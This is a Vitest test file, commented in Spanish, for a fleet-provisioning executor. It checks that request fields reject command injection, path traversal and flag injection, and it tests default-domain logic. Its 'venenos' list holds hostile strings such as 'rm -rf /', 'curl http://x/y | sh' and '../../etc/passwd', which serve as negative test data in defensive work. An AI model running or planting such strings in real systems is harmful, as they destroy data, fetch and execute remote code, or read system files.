import { describe, it, expect } from 'vitest'
// @ts-expect-error — módulo .mjs sin tipos, como el resto de `apps/flota`
import { validarSolicitud, argumentosDeAlta, CAMPOS, dominioDeAlta, zonaPorOmision } from './solicitudes.mjs'

// ============================================================================
//  La validación de una solicitud de alta.  (ADR 0027)
//
//  ESTA ES LA SUPERFICIE REAL DE TODO EL DISEÑO, y por eso casi todo lo de aquí
//  son ataques.
//
//  El panel no tiene credenciales: lo único que puede hacer un panel
//  comprometido es ESCRIBIR UNA SOLICITUD. El ejecutor la lee y aprovisiona una
//  máquina con ella. Así que la solicitud es la entrada no confiable del
//  sistema, y se valida en el ejecutor OTRA VEZ -- no porque el panel valide
//  mal, sino porque el ejecutor no puede fiarse de que quien escribió el
//  archivo fuera el panel.
// ============================================================================

const buena = { instancia: 'pixeled', dominio: 'space-os.pixeled.mx', email: 'jefe@pixeled.mx' }

describe('lo que pasa, pasa entero', () => {
  it('una solicitud correcta se acepta', () => {
    const r = validarSolicitud(buena)
    expect(r.ok, JSON.stringify(r.errores)).toBe(true)
  })

  it('faltar un campo la rechaza, y dice cuál', () => {
    for (const campo of CAMPOS) {
      const copia: any = { ...buena }
      delete copia[campo]
      const r = validarSolicitud(copia)
      expect(r.ok, `sin ${campo} deberia fallar`).toBe(false)
      expect(r.errores.join(' ')).toContain(campo)
    }
  })
})

describe('nada de lo que llega acaba en una linea de comandos', () => {
  // El ejecutor lanza `provision-instancia.sh`. Si estos valores llegaran a un
  // shell, cualquiera de estos los convertiria en ejecucion de comandos EN EL
  // PADRE, que es la maquina con los tokens de toda la flota.
  const venenos = [
    'a.mx; rm -rf /',
    'a.mx && curl http://x/y | sh',
    'a.mx$(whoami)',
    'a.mx`id`',
    'a.mx | tee /tmp/x',
    'a.mx\nrm -rf /',
    'a.mx\r\nX',
    '--dominio=otro',
    '-rf',
    '../../etc/passwd',
    'a mx',
    "a'mx",
    'a"mx',
  ]

  it('el dominio los rechaza TODOS', () => {
    for (const v of venenos) {
      expect(validarSolicitud({ ...buena, dominio: v }).ok, `paso: ${JSON.stringify(v)}`).toBe(false)
    }
  })

  it('el nombre de la instancia también', () => {
    for (const v of venenos) {
      expect(validarSolicitud({ ...buena, instancia: v }).ok, `paso: ${JSON.stringify(v)}`).toBe(false)
    }
  })

  it('y el correo', () => {
    for (const v of venenos) {
      expect(validarSolicitud({ ...buena, email: v }).ok, `paso: ${JSON.stringify(v)}`).toBe(false)
    }
  })

  it('el nombre no puede empezar por guion, que un guion lo lee como bandera', () => {
    expect(validarSolicitud({ ...buena, instancia: '-x' }).ok).toBe(false)
    expect(validarSolicitud({ ...buena, dominio: '-x.mx' }).ok).toBe(false)
  })

  it('ni servir para salirse del directorio de solicitudes', () => {
    // El nombre acaba siendo parte de un nombre de archivo.
    for (const v of ['../otro', 'a/b', 'a\\b', '.', '..']) {
      expect(validarSolicitud({ ...buena, instancia: v }).ok, v).toBe(false)
    }
  })
})

describe('lo que la solicitud NO puede decidir', () => {
  it('ni region, ni tamaño, ni canal: son del entorno del ejecutor', () => {
    // Un desplegable con `beta` seria saltarse el invariante 13 sin darse
    // cuenta, y una region elegida desde fuera es una factura elegida desde
    // fuera. Aunque vengan en el archivo, se ignoran.
    const args = argumentosDeAlta(
      { ...buena, canal: 'beta', region: 'fra1', tamano: 's-8vcpu-16gb' },
      { DO_REGION: 'nyc1', DO_TAMANO: 's-1vcpu-1gb' },
    )
    expect(args.entorno.DO_REGION).toBe('nyc1')
    expect(args.entorno.DO_TAMANO).toBe('s-1vcpu-1gb')
    expect(args.entorno.CANAL, 'el canal NO se pasa: el guion usa `estable` por omision').toBeUndefined()
    expect(args.argumentos.join(' ')).not.toMatch(/beta|fra1|16gb/)
  })

  it('los argumentos van como LISTA, nunca como una cadena', () => {
    // Con una lista y `spawn` sin shell, un valor raro es un valor raro y no
    // un comando. La cadena es lo que convierte un dato en ejecucion.
    const args = argumentosDeAlta(buena, { DO_REGION: 'nyc1', DO_TAMANO: 's-1vcpu-1gb' })
    expect(Array.isArray(args.argumentos)).toBe(true)
    expect(args.argumentos).toContain('--dominio')
    expect(args.argumentos).toContain('space-os.pixeled.mx')
  })

  it('y no se construye nada si la solicitud no es valida', () => {
    expect(() => argumentosDeAlta({ ...buena, dominio: 'a.mx; id' }, {})).toThrow()
  })
})

// ============================================================================
//  El dominio por omision: que el camino facil sea el correcto.
// ----------------------------------------------------------------------------
//  El 2026-09-08 se pidieron DOS altas con dominios que no existian
//  --`g500-space-os.com.mx` y `g500-space-os.com`, ninguno registrado ni en
//  Cloudflare-- y la segunda creo un droplet que se quedo esperando un nombre
//  que nadie podia apuntar. `validarSolicitud()` comprueba la FORMA, y la forma
//  era impecable las dos veces.
//
//  Crear un hijo «como ensayo4» exigia SABER que habia que teclear
//  `algo.<nuestra-zona>`. Ahora se deja en blanco y sale eso mismo: cuelga de
//  una zona que gestionamos, asi que el registro A lo pone el ejecutor solo.
describe('dominioDeAlta y zonaPorOmision', () => {
  const UNA = { 'space-os.io': 'id-1' }
  const DOS = { 'space-os.io': 'id-1', 'otra.mx': 'id-2' }

  it('con UNA zona gestionada, esa es la de por omision', () => {
    expect(zonaPorOmision(UNA)).toBe('space-os.io')
  })

  // Con dos, elegir seria adivinar de quien es la instancia nueva.
  it('con DOS zonas no hay omision: null', () => {
    expect(zonaPorOmision(DOS)).toBeNull()
  })

  it('sin zonas tampoco', () => {
    expect(zonaPorOmision({})).toBeNull()
    expect(zonaPorOmision()).toBeNull()
  })

  it('dominio en blanco + una zona → <instancia>.<zona>', () => {
    expect(dominioDeAlta({ instancia: 'g500', dominio: '' }, UNA)).toBe('g500.space-os.io')
  })

  it('dominio ausente del todo, igual', () => {
    expect(dominioDeAlta({ instancia: 'g500' }, UNA)).toBe('g500.space-os.io')
  })

  // Lo mas importante: NO se corrige un dominio escrito. Puede ser el propio del
  // owner, que es el caso normal del modelo de instancias soberanas.
  it('un dominio ESCRITO se respeta tal cual, aunque no sea de nuestra zona', () => {
    expect(dominioDeAlta({ instancia: 'g500', dominio: 'space-os.g500.com.mx' }, UNA)).toBe(
      'space-os.g500.com.mx',
    )
  })

  it('y tampoco se toca uno escrito con espacios: que falle y se vea', () => {
    // `validarSolicitud()` lo rechaza por la forma; corregirlo aqui en silencio
    // es como se cuelan las cosas.
    expect(dominioDeAlta({ instancia: 'g500', dominio: ' g500.space-os.io' }, UNA)).toBe(
      ' g500.space-os.io',
    )
  })

  it('sin zona unica no se inventa nada: se deja el hueco y falla la validacion', () => {
    expect(dominioDeAlta({ instancia: 'g500', dominio: '' }, DOS)).toBe('')
    expect(validarSolicitud({ instancia: 'g500', dominio: '', email: 'a@b.co' }).ok).toBe(false)
  })

  it('sin instancia tampoco: no se produce `.space-os.io`', () => {
    expect(dominioDeAlta({ instancia: '', dominio: '' }, UNA)).toBe('')
  })

  it('lo que produce PASA la validacion, que es el punto', () => {
    const d = { instancia: 'g500', dominio: '', email: 'duenio@ejemplo.com' }
    d.dominio = dominioDeAlta(d, UNA)
    expect(validarSolicitud(d)).toEqual({ ok: true, errores: [] })
  })
})
